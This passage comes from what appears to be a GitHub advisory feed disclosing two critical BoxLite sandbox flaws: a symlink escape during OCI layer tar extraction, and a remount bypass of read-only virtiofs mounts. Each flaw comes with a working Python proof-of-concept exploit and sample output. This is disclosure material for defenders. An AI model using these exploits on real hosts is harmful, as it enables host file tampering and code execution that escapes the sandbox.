<p><strong>Issue:</strong> The symlink's <code>full_path</code> (the link itself) is sanitized by <code>normalize_entry_path</code> to stay within <code>dest</code>. However, the <code>target</code> (what the symlink points to) is never validated. An entry with path <code>usr</code> and link target <code>/etc</code> creates <code>{dest}/usr -&gt; /etc</code>, a symlink pointing outside the extraction root. There is no check that <code>target</code> stays within <code>dest</code>, is relative, or doesn't escape the container root.</p>
<ol start="3">
<li>Symlink Target Written Verbatim</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>create_symlink()</code> (line 747) <strong>Code:</strong></p>
<pre><code class="language-rust">fn create_symlink(path: &amp;Path, target: &amp;Path) -&gt; BoxliteResult&lt;()&gt; {
    std::os::unix::fs::symlink(target, path).map_err(|e| { /* ... */ })
}
</code></pre>
<p><strong>Issue:</strong> <code>std::os::unix::fs::symlink</code> is an <code>lstat</code>-level operation — it creates the symlink with the provided target string verbatim, no matter what it contains. If <code>target</code> is <code>/etc</code>, the link records <code>/etc</code> as the target. No containment check.</p>
<ol start="4">
<li>ensure_parent_dirs Deliberately Follows and Preserves Escape Symlinks</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>ensure_parent_dirs()</code> (line 457) <strong>Code:</strong></p>
<pre><code class="language-rust">Ok(m) if m.file_type().is_symlink() =&gt; {
    // Check if symlink points to a directory
    match fs::metadata(current_check) {  // follows symlink
        Ok(target_m) if target_m.is_dir() =&gt; {
            trace!("Preserving symlink that points to directory: ...");
            break;  // line 516 — stop, keep the symlink, treat as valid parent
        }
</code></pre>
<p><strong>Issue:</strong> When the next tar entry has path <code>usr/passwd</code> and the code calls <code>ensure_parent_dirs("{dest}/usr/passwd", dest)</code>, it walks up to <code>{dest}/usr</code>, finds it is a symlink pointing to a directory (e.g., <code>/etc</code>), and explicitly <strong>breaks</strong> the loop to preserve it — treating the out-of-root symlink as a valid, navigable parent. The <code>create_dir_all</code> call is then skipped for this path. The caller proceeds to open and write <code>{dest}/usr/passwd</code>, which the kernel resolves through the symlink to <code>/etc/passwd</code>.</p>
<ol start="5">
<li>File Written Through Escaped Symlink</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>create_regular_file()</code> (line 715) <strong>Code:</strong></p>
<pre><code class="language-rust">fn create_regular_file&lt;R: Read&gt;(entry: &amp;mut Entry&lt;R&gt;, path: &amp;Path, mode: u32) -&gt; BoxliteResult&lt;()&gt; {
    let mut file = OpenOptions::new()
        .write(true).create(true).truncate(true).mode(mode)
        .open(path)   // path = "{dest}/usr/passwd" which kernel follows to "/etc/passwd"
        .map_err(|e| { /* ... */ })?;
    io::copy(entry, &amp;mut file)?;   // attacker-controlled content written to /etc/passwd
    Ok(())
}
</code></pre>
<p><strong>Issue:</strong> <code>OpenOptions::open()</code> follows symlinks in path components by default. The kernel resolves <code>{dest}/usr/passwd</code> → <code>{dest}/usr</code> is a symlink to <code>/etc</code> → file opened at <code>/etc/passwd</code>. Attacker-controlled tar entry content is copied there verbatim.</p>
<p>As seen from the code, when a tar entry is a symlink, Boxlite's security checks are insufficient. An attacker can exploit this vulnerability to achieve arbitrary file write once a user loads a maliciously crafted image. The write permission is consistent with the process privilege running the Boxlite service, which is commonly root on Linux. The attacker can further leverage this capability to achieve remote code execution, such as writing the attacker's public key into the host's authorized_keys.</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC: BoxLite OCI Layer Extraction Symlink Escape
=================================================

Vulnerability: boxlite/src/images/archive/tar.rs — extract_layer_tarball_streaming()
Type:          CWE-61 / CAPEC-132 — Symlink Following during tar extraction

Attack:
  OCI images consist of layer tarballs extracted on the host to build the ext4
  base image. If the extractor follows a symlink without verifying the resolved
  path stays within the extraction root, an attacker can craft a tar like:

    [1] SYMLINK  escape  -&gt;  /tmp          (points to host /tmp)
    [2] FILE     escape/poc/pwned.txt       (resolves via [1] to /tmp/poc/pwned.txt)

  KVM hardware isolation is irrelevant here — tar extraction happens in the host
  process before the VM ever starts.

Target write: /tmp/boxlite_host_escape/pwned.txt
Expected isolation boundary: boxlite internal staging dir under /tmp
"""

import asyncio
import hashlib
import io
import json
import os
import shutil
import tarfile
import time

TARGET_FILE = "/tmp/boxlite_host_escape/pwned.txt"
OCI_LAYOUT_DIR = "/tmp/malicious_oci_layout"


# ── Helpers ───────────────────────────────────────────────────────────────────


def sha256hex(data: bytes) -&gt; str:
    return hashlib.sha256(data).hexdigest()


def add_entry(
    tf: tarfile.TarFile,
    name: str,
    type_: bytes,
    linkname: str = "",
    data: bytes = b"",
    mode: int = 0o644,
):
    info = tarfile.TarInfo(name=name)
    info.type = type_
    info.linkname = linkname
    info.size = len(data)
    info.mode = mode
    info.mtime = int(time.time())
    tf.addfile(info, io.BytesIO(data) if data else None)


# ── Step 1: Build malicious OCI layer tar ─────────────────────────────────────


def build_layer_tar() -&gt; bytes:
    """
    Tar entries (order matters):
      [1] SYMLINK  escape            -&gt;  /tmp
      [2] DIR      escape/boxlite_host_escape/     (resolves to /tmp/boxlite_host_escape/)
      [3] FILE     escape/boxlite_host_escape/pwned.txt  (resolves to /tmp/…/pwned.txt)
      [4] FILE     etc/os-release    (legitimate-looking decoy entries)
    """
    payload = (
        "===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====\n"
        f"Written at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"Target: {TARGET_FILE}\n"
        "========================================================\n"
    ).encode()

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        add_entry(tf, "escape", tarfile.SYMTYPE, linkname="/tmp", mode=0o777)
        add_entry(tf, "escape/boxlite_host_escape", tarfile.DIRTYPE, mode=0o755)
        add_entry(
            tf, "escape/boxlite_host_escape/pwned.txt", tarfile.REGTYPE, data=payload
        )
        add_entry(
            tf,
            "etc/os-release",
            tarfile.REGTYPE,
            data=b"ID=alpine\nVERSION_ID=3.19.0\n",
        )
    return buf.getvalue()


# ── Step 2: Build OCI image layout ───────────────────────────────────────────


def build_oci_layout(out_dir: str) -&gt; None:
    blobs = os.path.join(out_dir, "blobs", "sha256")
    os.makedirs(blobs, exist_ok=True)

    def write_blob(data: bytes) -&gt; tuple[str, int]:
        dgst = sha256hex(data)
        with open(os.path.join(blobs, dgst), "wb") as f:
            f.write(data)
        return dgst, len(data)

    layer_bytes = build_layer_tar()
    layer_dgst, layer_sz = write_blob(layer_bytes)

    config_bytes = json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "config": {"Cmd": ["/bin/sh"]},
            "rootfs": {"type": "layers", "diff_ids": [f"sha256:{layer_dgst}"]},
        }
    ).encode()
    cfg_dgst, cfg_sz = write_blob(config_bytes)

    manifest_bytes = json.dumps(
        {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "config": {
                "mediaType": "application/vnd.oci.image.config.v1+json",
                "digest": f"sha256:{cfg_dgst}",
                "size": cfg_sz,
            },
            "layers": [
                {
                    "mediaType": "application/vnd.oci.image.layer.v1.tar",
                    "digest": f"sha256:{layer_dgst}",
                    "size": layer_sz,
                }
            ],
        }
    ).encode()
    mf_dgst, mf_sz = write_blob(manifest_bytes)

    with open(os.path.join(out_dir, "index.json"), "w") as f:
        json.dump(
            {
                "schemaVersion": 2,
                "manifests": [
                    {
                        "mediaType": "application/vnd.oci.image.manifest.v1+json",
                        "digest": f"sha256:{mf_dgst}",
                        "size": mf_sz,
                        "annotations": {"org.opencontainers.image.ref.name": "latest"},
                    }
                ],
            },
            f,
        )

    with open(os.path.join(out_dir, "oci-layout"), "w") as f:
        json.dump({"imageLayoutVersion": "1.0.0"}, f)

    print(f"  layer    sha256:{layer_dgst[:16]}…  ({layer_sz} B)")
    print(f"  config   sha256:{cfg_dgst[:16]}…  ({cfg_sz} B)")
    print(f"  manifest sha256:{mf_dgst[:16]}…  ({mf_sz} B)")


# ── Main ──────────────────────────────────────────────────────────────────────


async def main():
    print("=" * 60)
    print("  PoC: BoxLite OCI Layer Extraction Symlink Escape")
    print("=" * 60)

    # Clean up previous run artifacts
    for path in [TARGET_FILE, "/tmp/boxlite_host_escape", OCI_LAYOUT_DIR]:
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path)

    # [1] Build malicious OCI image
    print(f"\n[1] Building malicious OCI image → {OCI_LAYOUT_DIR}")
    build_oci_layout(OCI_LAYOUT_DIR)

    # [2] Show crafted tar entries
    print("\n[2] Malicious layer tar entries:")
    with open(os.path.join(OCI_LAYOUT_DIR, "index.json")) as f:
        idx = json.load(f)
    mf_dgst = idx["manifests"][0]["digest"].split(":")[1]
    with open(os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", mf_dgst)) as f:
        mf = json.load(f)
    lyr_dgst = mf["layers"][0]["digest"].split(":")[1]
    lyr_data = open(
        os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", lyr_dgst), "rb"
    ).read()
    with tarfile.open(fileobj=io.BytesIO(lyr_data)) as tf:
        for m in tf.getmembers():
            tstr = {
                tarfile.REGTYPE: "FILE   ",
                tarfile.SYMTYPE: "SYMLINK",
                tarfile.DIRTYPE: "DIR    ",
            }.get(m.type, f"?{m.type}   ")
            suffix = f" -&gt; {m.linkname}" if m.issym() else ""
            print(f"    {tstr}  {m.name}{suffix}")

    # [3] Confirm target absent before exploit
    print(f"\n[3] Pre-exploit — target exists? {os.path.exists(TARGET_FILE)}")

    # [4] Trigger extraction (vulnerability fires before VM starts)
    print(f"\n[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)")
    import boxlite

    try:
        async with boxlite.SimpleBox(rootfs_path=OCI_LAYOUT_DIR) as box:
            r = await box.exec("sh", "-c", "echo ok")
            print(f"    VM stdout: {r.stdout.strip()}")
    except Exception as e:
        # Box may fail to start (incomplete rootfs) — that's fine;
        # the symlink escape occurs during layer extraction, before VM launch.
        print(f"    Box error (expected): {type(e).__name__}: {e}")

    # [5] Verify host write
    print(f"\n[5] Post-exploit — target exists? {os.path.exists(TARGET_FILE)}")
    if os.path.exists(TARGET_FILE):
        print(f"\n  VULNERABLE — host file written successfully!")
        print(f"  Path: {TARGET_FILE}")
        print(open(TARGET_FILE).read())
    else:
        print("\n  NOT VULNERABLE (or already patched)")


if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
<p>This script constructs a malicious OCI image and passes it to the SimpleBox function via rootfs_path to create a container. In the malicious image, a symlink is first created pointing <code>escape</code> to <code>/tmp</code>, and then files are written under <code>escape</code>, thereby achieving file writes to the root filesystem.</p>
<p>Sample output:</p>
<pre><code>$ python3 poc_symlink_escape.py
============================================================
  PoC: BoxLite OCI Layer Extraction Symlink Escape
============================================================

[1] Building malicious OCI image → /tmp/malicious_oci_layout
  layer    sha256:a1e8b4de11d64fce…  (10240 B)
  config   sha256:8e245c2c65565998…  (191 B)
  manifest sha256:2dad6671e78d8093…  (415 B)

[2] Malicious layer tar entries:
    SYMLINK  escape -&gt; /tmp
    DIR      escape/boxlite_host_escape
    FILE     escape/boxlite_host_escape/pwned.txt
    FILE     etc/os-release

[3] Pre-exploit — target exists? False

[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)
    Box error (expected): RuntimeError: internal error: Container init failed: Failed to start container: internal error: Failed to create container b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54 at bundle /run/boxlite/containers/b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54: failed to create container: exec process failed with error error in executing process : PATH environment variable is not set

[5] Post-exploit — target exists? True

  VULNERABLE — host file written successfully!
  Path: /tmp/boxlite_host_escape/pwned.txt
===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====
Written at: ...
Target: /tmp/boxlite_host_escape/pwned.txt
========================================================
</code></pre>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.</p>
<h4 id="score">Score</h4>
<p>Severity: Critical, Score: 9.7, rationale as follows:</p>
<ul>
<li>AV:N — The attacker can distribute the malicious image over the network, tricking users into pulling and using it</li>
<li>AC:L — This is a logic vulnerability that requires no complex exploitation</li>
<li>PR:N — The attacker does not need any additional privileges to exploit this vulnerability</li>
<li>UI:R — The attacker needs to trick the victim into using the maliciously crafted image</li>
<li>S:C — The attacker can leverage the vulnerability to achieve arbitrary command execution on the host, extending the impact to the host operating system and crossing the security boundary</li>
<li>C:H/I:H/A:H — The attacker can leverage the vulnerability to gain RCE capability on the host, posing a significant threat to confidentiality, integrity, and availability</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to BoxLite for further discussion by emailing <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that Boxlite follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that BoxLite reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-f396-4rp4-7v2j">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-f396-4rp4-7v2j</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0148.html">https://rustsec.org/advisories/RUSTSEC-2026-0148.html</a></li>
<li><a href="https://github.com/advisories/GHSA-f396-4rp4-7v2j">https://github.com/advisories/GHSA-f396-4rp4-7v2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f396-4rp4-7v2j</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-21T21:54:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boxlite] BoxLite: Permission Bypass Allows Modification of Read-Only Files]]></title>
        <id>https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</id>
        <link href="https://github.com/advisories/GHSA-g6ww-w5j2-r7x3"/>
        <updated>2026-05-21T21:52:52.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and launch OCI containers within them to run untrusted code.</p>
<p>One of the core security features claimed by Boxlite is the ability to mount host directories in read-only mode (read_only=True) into the VM via the virtiofs protocol (a host-guest shared filesystem protocol designed specifically for virtual machines), so that untrusted code can only read but not modify host data. Since the underlying function of the lightweight VM library libkrun used by Boxlite does not support mounting in read-only mode, Boxlite chooses to implement read-only by adding the MS_RDONLY flag when mounting the directory after the VM starts.</p>
<p>However, because Boxlite does not restrict the kernel capabilities available inside the container, malicious code can remount the directory in rw mode, thereby gaining write access to that directory. This allows malicious code to perform arbitrary write operations on directories that should be read-only.</p>
<p>In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.</p>
<h4 id="details">Details</h4>
<ol>
<li>User-Facing API Documents Read-Only Guarantee</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/runtime/options.rs</code> <strong>Function:</strong> <code>VolumeSpec</code> (line 223) <strong>Code:</strong></p>
<pre><code class="language-rust">/// Filesystem mount specification.
pub struct VolumeSpec {
    pub host_path: String,
    pub guest_path: String,
    pub read_only: bool,  // &lt;-- operator sets this to restrict guest write access
}
</code></pre>
<p><strong>Issue:</strong> The <code>read_only</code> field is documented (and in user-facing guides) as preventing the guest from writing to the host directory. The guarantee is "Agent can read but not write." This expectation is not met.</p>
<ol start="2">
<li>read_only Stored in FsShare — Passed to krun Without Enforcement</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/vmm/krun/engine.rs</code> <strong>Function:</strong> <code>Krun::create()</code> (line 334) <strong>Code:</strong></p>
<pre><code class="language-rust">for share in config.fs_shares.shares() {
    let path_str = share.host_path.to_str().ok_or_else(|| { ... })?;

    tracing::info!(
        "  {} → {} ({})",
        share.tag,
        share.host_path.display(),
        if share.read_only { "ro" } else { "rw" }  // Logged but NOT passed to krun
    );
    ctx.add_virtiofs(&amp;share.tag, path_str)?;  // &lt;-- read_only silently dropped
}
</code></pre>
<p><strong>Issue:</strong> <code>share.read_only</code> is logged as "ro" or "rw" but is never passed to <code>add_virtiofs</code>. The actual hypervisor call receives only tag and host path.</p>
<ol start="3">
<li>Hypervisor FFI Has No Read-Only Parameter</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/vmm/krun/context.rs</code> <strong>Function:</strong> <code>add_virtiofs()</code> (line 423) <strong>Code:</strong></p>
<pre><code class="language-rust">pub unsafe fn add_virtiofs(&amp;self, mount_tag: &amp;str, host_path: &amp;str) -&gt; BoxliteResult&lt;()&gt; {
    let host_path_c = CString::new(host_path)
        .map_err(|e| BoxliteError::Engine(format!("invalid host path: {e}")))?;
    let mount_tag_c = CString::new(mount_tag)
        .map_err(|e| BoxliteError::Engine(format!("invalid mount tag: {e}")))?;

    check_status("krun_add_virtiofs", unsafe {
        krun_add_virtiofs(self.ctx_id, mount_tag_c.as_ptr(), host_path_c.as_ptr())
        // No read_only parameter — libkrun exposes the share as read-write to the guest
    })
}
</code></pre>
<p><strong>Issue:</strong> <code>krun_add_virtiofs</code> in the FFI (<code>deps/libkrun-sys/src/lib.rs:35</code>) takes only <code>ctx_id</code>, <code>mount_tag</code>, and <code>host_path</code>. There is no read-only flag. Libkrun exposes the virtiofs share to the guest with full read-write access at the device level.</p>
<ol start="4">
<li>Read-Only Enforcement Is Delegated to Guest Agent (Zone 0)</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/volumes/guest_volume.rs</code> <strong>Function:</strong> <code>build_guest_mounts()</code> (line 184) <strong>Code:</strong></p>
<pre><code class="language-rust">for entry in &amp;self.fs_shares {
    let mount_point = entry.guest_path.as_deref().unwrap_or("");
    volumes.push(VolumeConfig::virtiofs(
        &amp;entry.tag,
        mount_point,
        entry.read_only,       // &lt;-- sent to guest agent as instruction
        entry.container_id.clone(),
    ));
}
</code></pre>
<p><strong>Issue:</strong> The <code>read_only</code> flag is sent to the guest agent via gRPC as a mount instruction. The guest agent is expected to pass <code>-o ro</code> to the mount syscall. But the guest runs Zone 0 code — untrusted, assumed malicious. A compromised or malicious guest simply ignores this instruction.</p>
<ol start="5">
<li>FFI Declaration Confirms No Read-Only Variant Exists</li>
</ol>
<p><strong>File:</strong> <code>boxlite/deps/libkrun-sys/src/lib.rs</code> <strong>Function:</strong> <code>krun_add_virtiofs</code> extern declaration (line 35) <strong>Code:</strong></p>
<pre><code class="language-rust">extern "C" {
    pub fn krun_add_virtiofs(
        ctx_id: u32,
        mount_tag: *const c_char,
        host_path: *const c_char,
    ) -&gt; i32;
    // No krun_add_virtiofs_ro or equivalent declared
}
</code></pre>
<p><strong>Issue:</strong> There is no alternative read-only virtiofs FFI function declared. The entire codebase has no <code>krun_add_virtiofs_ro</code> or read-only parameter variant. Enforcement at the hypervisor level does not exist.</p>
<ol start="6">
<li>OCI Spec Builder Grants All Capabilities</li>
</ol>
<p> <strong>File:</strong> <code>guest/src/container/capabilities.rs</code> <strong>Function:</strong> <code>all_capabilities()</code> (line 19) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn all_capabilities() -&gt; HashSet&lt;Capability&gt; {
    [
        // ...
        Capability::SysModule,    // 16: load/unload kernel modules
        Capability::SysRawio,     // 17: perform I/O port operations
        Capability::SysAdmin,     // 21: various admin operations
        Capability::NetAdmin,     // 12: network administration
        Capability::NetRaw,       // 13: use RAW/PACKET sockets
        Capability::MacOverride,  // 32: override MAC
        Capability::Bpf,          // 39: BPF operations
        // ... all 41 capabilities
    ]
    .into_iter()
    .collect()
}
</code></pre>
<p><strong>Issue:</strong> Returns all 41 capabilities including the most dangerous ones, like <code>Capability::SysAdmin</code>. The function comment itself says "maximum compatibility but reduced security isolation."</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">import asyncio
import os
import tempfile
import sys
from boxlite import Boxlite, BoxOptions


async def run(box, cmd):
    """Run shell command via native box.exec API."""
    execution = await box.exec("sh", ["-c", cmd], None)
    stdout_stream = execution.stdout()
    stderr_stream = execution.stderr()

    stdout_lines, stderr_lines = [], []

    async def read_stdout():
        async for line in stdout_stream:
            stdout_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))

    async def read_stderr():
        async for line in stderr_stream:
            stderr_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))

    await asyncio.gather(read_stdout(), read_stderr())
    result = await execution.wait()

    return {
        'exit_code': result.exit_code,
        'stdout': ''.join(stdout_lines),
        'stderr': ''.join(stderr_lines),
    }

async def main():
    # Step 1: Set up host directory with a read-only file
    host_dir = tempfile.mkdtemp(prefix="virtiofs_ro_poc_")
    ro_file = os.path.join(host_dir, "read_only.txt")

    with open(ro_file, "w") as f:
        f.write("original content\n")

    print(f"[+] Step 1: Host directory created: {host_dir}")
    print(f"    read_only.txt: {open(ro_file).read().strip()}")
    print()

    guest_mount = "/mnt/sensitive"
    print(f"[+] Step 2: Launching BoxLite VM with:")
    print(f"    volumes=[('{host_dir}', '{guest_mount}', True)]  # read_only=True")
    print()

    try:
        runtime = Boxlite.default()
        opts = BoxOptions(
            image="alpine:latest",
            volumes=[(host_dir, guest_mount, True)],  # &lt;-- read_only=True
            memory_mib=512,
            cpus=1,
            auto_remove=True,
        )

        box = await runtime.create(opts)
        async with box:
            print("[+] Step 3: VM booted. Checking virtiofs mount state...")
            r = await run(box, f"cat /proc/mounts | grep sensitive")
            print(f"    /proc/mounts: {r['stdout'].strip()}")
            print()

            print("[+] Step 4: Testing write protection (initial state)...")
            r2 = await run(box, f"echo 'modified content' &gt; {guest_mount}/read_only.txt 2&gt;&amp;1; echo write_exit:$?")
            out = r2['stdout'].strip()
            print(f"    Write attempt: {out}")
            if "Read-only" in out or "read-only" in out:
                print(f"    [OK] Initially blocked - client-side MS_RDONLY is active")
            print()

            print("[!!!] Step 5: ATTACK - Bypassing read-only via remount...")
            r3 = await run(box, f"mount -o remount,rw {guest_mount} 2&gt;&amp;1; echo remount_exit:$?")
            print(f"    Remount result: {r3['stdout'].strip()}")
            r4 = await run(box, f"cat /proc/mounts | grep sensitive")
            print(f"    Mount flags after: {r4['stdout'].strip()}")
            print()

            print("[!!!] Step 6: Writing to 'read-only' mount after bypass...")
            r5 = await run(box, f"echo 'modified content' &gt; {guest_mount}/read_only.txt 2&gt;&amp;1; echo write_exit:$?")
            print(f"    Write result: {r5['stdout'].strip()}")
            r6 = await run(box, f"cat {guest_mount}/read_only.txt")
            print(f"    File content inside guest: {r6['stdout'].strip()}")
            print()

        print("[+] Step 7: HOST VERIFICATION")
        content = open(ro_file).read().strip()
        print(f"    read_only.txt on host: {content}")
        print()

        print("FINAL RESULT:")
        print()
        if content == "modified content":
            print("  [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE")
        else:
            print("  [?] Bypass did not produce host-side writes.")

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        import shutil
        try:
            shutil.rmtree(host_dir)
            print(f"\n[+] Cleanup: removed {host_dir}")
        except:
            pass

asyncio.run(main())
</code></pre>
<p>This script mounts a directory in read-only mode into the sandbox and attempts to exploit the vulnerability to modify a file in that directory. Expected output:</p>
<pre><code>$ python poc.py
[+] Step 1: Host directory created: /tmp/virtiofs_ro_poc_93fdis21
    read_only.txt: original content

[+] Step 2: Launching BoxLite VM with:
    volumes=[('/tmp/virtiofs_ro_poc_93fdis21', '/mnt/sensitive', True)]  # read_only=True

[+] Step 3: VM booted. Checking virtiofs mount state...
    /proc/mounts: uservol0 /mnt/sensitive virtiofs ro,relatime 0 0

[+] Step 4: Testing write protection (initial state)...
    Write attempt: write_exit:1

[!!!] Step 5: ATTACK - Bypassing read-only via remount...
    Remount result: remount_exit:0
    Mount flags after: uservol0 /mnt/sensitive virtiofs rw,relatime 0 0

[!!!] Step 6: Writing to 'read-only' mount after bypass...
    Write result: write_exit:0
    File content inside guest: modified content

[+] Step 7: HOST VERIFICATION
    read_only.txt on host: modified content

FINAL RESULT:

  [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE

[+] Cleanup: removed /tmp/virtiofs_ro_poc_93fdis21
</code></pre>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>Malicious code can perform arbitrary write operations on directories that should be read-only.</p>
<p>In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.</p>
<h4 id="score">Score</h4>
<p>Severity: Critical, Score: 10.0, rationale as follows: </p>
<ul>
<li><strong>AV:N</strong> — Malicious code can be transmitted through networks, such as code written by large language models.</li>
<li><strong>AC:L</strong> — No special conditions or race conditions are required. The attacker simply executes a <code>mount -o remount,rw</code> command inside the container. <code>CAP_SYS_ADMIN</code> is granted by default, and the attack is deterministic and trivially reproducible.</li>
<li><strong>PR:N</strong> — The attacker needs the ability to execute arbitrary code inside the Boxlite sandbox, which is the fundamental use case of Boxlite (running untrusted code). </li>
<li><strong>UI:N</strong> — No user interaction is required. Malicious code inside the container can autonomously exploit this vulnerability without any action from the host operator.</li>
<li><strong>S:C</strong> — The vulnerability allows the attacker to cross the sandbox trust boundary and impact the host system. The vulnerable component is the Boxlite sandbox isolation mechanism, but the impacted component is the host filesystem.</li>
<li><strong>C:H</strong> — With write access to host directories, the attacker can plant malicious code that will be executed by the host, leading to full compromise of sensitive host data including credentials, API keys, user code, and configuration files mounted into the container.</li>
<li><strong>I:H</strong> — The attacker gains full write access to host directories explicitly intended to be read-only, allowing arbitrary modification of host files including planting backdoors, modifying virtual environments for supply chain attacks, and altering credentials and configuration files.</li>
<li><strong>A:N</strong> — The vulnerability primarily enables unauthorized write access. The host system and Boxlite service continue to function; no distinct availability impact mechanism exists beyond secondary consequences of write access.</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>CVE and credit are preferred.</p>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that BoxLite follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that BoxLite reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h4 id="resolution">Resolution</h4>
<p>Fixed in <strong>v0.9.0</strong> by PR #454 (commit <code>2c26968e</code>), released 2026-04-29, with defense-in-depth across three layers:</p>
<ol>
<li><strong>Hypervisor-level read-only enforcement.</strong> virtio-fs shares are now created via <code>krun_add_virtiofs3</code> (libkrun v1.18.0) with the <code>read_only</code> flag passed through, so the share is read-only at the virtio-fs device — before any request reaches the guest kernel. A malicious guest <code>mount -o remount,rw</code> can no longer reach host data even if it regained <code>CAP_SYS_ADMIN</code>.</li>
<li><strong>Capability restriction.</strong> Containers now receive the 14 Docker-default capabilities, explicitly excluding <code>CAP_SYS_ADMIN</code> (and <code>CAP_NET_ADMIN</code>, <code>CAP_SYS_MODULE</code>, <code>CAP_SYS_RAWIO</code>, <code>CAP_MAC_OVERRIDE</code>), so the remount in the PoC fails with <code>EPERM</code>.</li>
<li><strong>TSI network isolation.</strong> When the network is disabled, the implicit vsock is replaced with an explicit vsock with no TSI features, closing a related guest→host socket-forwarding path.</li>
</ol>
<p>Regression coverage: <code>src/boxlite/tests/security_enforcement.rs</code> (Rust core) and <code>sdks/python/tests/test_readonly_volume_remount.py</code> (Python SDK) both replay the PoC remount attack and assert it fails.</p>
<p><strong>Remediation:</strong> upgrade to boxlite <strong>0.9.0 or later</strong> (all SDKs: PyPI <code>boxlite</code>, npm <code>@boxlite-ai/boxlite</code>, Go module <code>github.com/boxlite-ai/boxlite/sdks/go</code>, crates.io <code>boxlite</code> / <code>boxlite-cli</code>). There is no workaround for affected versions; upgrade is required.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-g6ww-w5j2-r7x3">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-g6ww-w5j2-r7x3</a></li>
<li><a href="https://github.com/boxlite-ai/boxlite/pull/454">https://github.com/boxlite-ai/boxlite/pull/454</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0147.html">https://rustsec.org/advisories/RUSTSEC-2026-0147.html</a></li>
